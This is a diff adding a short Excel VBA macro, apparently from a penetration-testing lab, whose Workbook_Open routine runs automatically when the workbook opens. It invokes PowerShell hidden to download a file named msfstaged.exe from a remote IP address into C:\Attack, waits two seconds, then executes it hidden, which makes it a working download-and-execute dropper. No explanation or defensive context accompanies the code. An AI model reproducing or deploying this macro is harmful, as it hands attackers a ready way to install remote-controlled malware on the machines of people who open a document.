@@ -1,0 +1,16 @@
+Sub Workbook_Open()
+    Dim strPath As String
+    Dim varProc As Variant
+    Call Shell("powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.133.58/msfstaged.exe', 'C:\Attack\msfstaged.exe')", vbHide)
+    Wait (2)
+    strPath = "C:\Attack\msfstaged.exe"
+    varProc = Shell(strPath, vbHide)
+End Sub
+
+Sub Wait(n As Long)
+    Dim t As Date
+    t = Now
+    Do
+        DoEvents
+    Loop Until Now >= DateAdd("s", n, t)
+End Sub
